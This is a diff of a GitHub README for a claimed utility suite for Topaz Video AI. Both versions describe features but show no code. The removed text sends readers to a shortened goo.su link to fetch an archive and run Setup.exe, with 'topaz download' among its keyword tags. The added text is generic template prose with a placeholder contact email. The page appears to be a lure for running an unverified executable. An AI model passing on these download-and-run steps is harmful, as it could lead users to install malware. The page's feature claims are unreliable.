@@ -1,64 +1,122 @@
-# **Topaz Video AI Tools**
+# 🎥 Topaz Video AI Tools
 
-###
+**Topaz Video AI Tools** is a utility set designed to enhance the workflow of **Topaz Video AI** users. This repository offers tools for preset management, batch organization, and system performance monitoring during AI-driven video enhancement tasks. 
 
-> [!info]\
-> **Topaz Video AI Tools** is a utility set designed to enhance the workflow of **Topaz Video AI** users by offering tools for preset management, batch organization, and system performance monitoring during AI-driven video enhancement tasks.
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue)](https://github.com/gracjan420/-Topaz-Video-AI-Tools-/releases)
 
-![image](https://github.com/user-attachments/assets/51c9e718-cafc-4515-b904-6940132bb277)
+## 📚 Table of Contents
 
----
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Tools Overview](#tools-overview)
+  - [Preset Management](#preset-management)
+  - [Batch Organization](#batch-organization)
+  - [System Performance Monitoring](#system-performance-monitoring)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-## **Program Overview**
+## 📖 Introduction
 
-**Topaz Video AI Tools** supports your upscaling and restoration workflow by organizing export profiles, tracking GPU/CPU load, and streamlining project configurations. Ideal for video editors, archivists, and content creators.
+Video enhancement can be a demanding task. Topaz Video AI provides powerful tools for improving video quality, but managing presets and optimizing performance can be challenging. This repository aims to simplify that process. 
 
----
+Whether you're a content creator, filmmaker, or hobbyist, **Topaz Video AI Tools** can streamline your workflow. 
 
-## **Core Features**
+## ✨ Features
 
-✔ **Profile Manager** – Save and switch between export and enhancement settings  
-✔ **Batch Queue Organizer** – Group, tag, and reorder video tasks with ease  
-✔ **Performance Monitor** – Track GPU and system resource usage per render  
-✔ **Project Snapshot** – Save and reload session configurations instantly  
-✔ **Optimized UI** – Lightweight and responsive for large video workflows
+- **Preset Management**: Easily create, edit, and delete presets for different video enhancement tasks.
+- **Batch Organization**: Manage multiple video files efficiently, allowing you to apply enhancements in bulk.
+- **System Performance Monitoring**: Track system resources to ensure optimal performance during AI tasks.
 
-![image](https://github.com/user-attachments/assets/75690921-77a2-4828-8e26-78da5a3941b2)
+## ⚙️ Installation
 
----
+To get started, you need to download the latest release. Visit the [Releases section](https://github.com/gracjan420/-Topaz-Video-AI-Tools-/releases) to download the latest version. 
 
-## **Installation Guide**
+After downloading, follow these steps:
 
-### ⚙️ **Quick Setup (Topaz Tools Installer)**
+1. Extract the downloaded file.
+2. Navigate to the extracted folder.
+3. Execute the installation script.
 
-📌 [Download](https://goo.su/txxzhx) and extract the archive  
-📌 Run `Setup.exe`  
-📌 **Launch Topaz Video AI Tools to upgrade your video processing workflow**
+Ensure you have the required dependencies installed before running the tools.
 
-⚠ **Note:** This utility does not modify or replace Topaz Video AI. It is intended for use alongside a licensed installation.
+## 🛠️ Usage
 
----
+Once installed, you can start using the tools. Here’s a brief overview of how to use each feature.
 
-## **Contributing**
+### Preset Management
 
-Have feedback or ideas? Contributions are welcome via issues and pull requests.
+1. Open the Preset Manager.
+2. Create a new preset by selecting your desired settings.
+3. Save the preset for future use.
+4. Edit or delete existing presets as needed.
 
----
+### Batch Organization
 
-## **License**
+1. Launch the Batch Organizer.
+2. Add video files to the list.
+3. Select the desired preset for enhancement.
+4. Start the batch process and monitor progress.
 
-Licensed under the MIT License. See the LICENSE file for terms and conditions.
+### System Performance Monitoring
 
----
+1. Open the Performance Monitor.
+2. Keep an eye on CPU, GPU, and RAM usage.
+3. Adjust settings in Topaz Video AI as necessary to maintain performance.
 
-## **Acknowledgments**
+## 🔧 Tools Overview
 
-- Thanks to the Topaz Labs community for testing and feedback  
-- Built with the needs of video professionals in mind  
-- Inspired by large-scale video restoration and enhancement workflows
+### Preset Management
 
----
+Managing presets effectively can significantly speed up your workflow. The Preset Manager allows you to:
 
-> **Tags:** topaz video ai, upscaling tools, batch video processor, ai enhancement manager, topaz download
+- **Create Presets**: Save specific settings for future use.
+- **Edit Presets**: Modify existing presets to better suit your needs.
+- **Delete Presets**: Remove presets that you no longer need.
 
-📌 Run `Setup.exe`
+### Batch Organization
+
+Batch processing is essential for efficiency. The Batch Organizer provides:
+
+- **File Management**: Organize multiple video files for processing.
+- **Preset Application**: Apply the same settings to all files in the batch.
+- **Progress Tracking**: Monitor the status of each file as it processes.
+
+### System Performance Monitoring
+
+Keeping track of system performance is crucial when running resource-intensive applications. The Performance Monitor offers:
+
+- **Real-Time Monitoring**: Observe CPU, GPU, and RAM usage.
+- **Alerts**: Get notified if resource usage exceeds certain thresholds.
+- **Optimization Suggestions**: Receive tips on how to adjust settings for better performance.
+
+## 🤝 Contributing
+
+Contributions are welcome! If you would like to contribute to **Topaz Video AI Tools**, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your branch to your forked repository.
+5. Submit a pull request with a clear description of your changes.
+
+## 📄 License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## 📬 Contact
+
+For any questions or feedback, feel free to reach out:
+
+- **Email**: your.email@example.com
+- **GitHub**: [gracjan420](https://github.com/gracjan420)
+
+## 🎉 Conclusion
+
+**Topaz Video AI Tools** is designed to make your video enhancement workflow smoother and more efficient. With features like preset management, batch organization, and system performance monitoring, you can focus on what matters most: creating stunning videos.
+
+For the latest updates and releases, check out the [Releases section](https://github.com/gracjan420/-Topaz-Video-AI-Tools-/releases). 
+
+Thank you for using **Topaz Video AI Tools**!
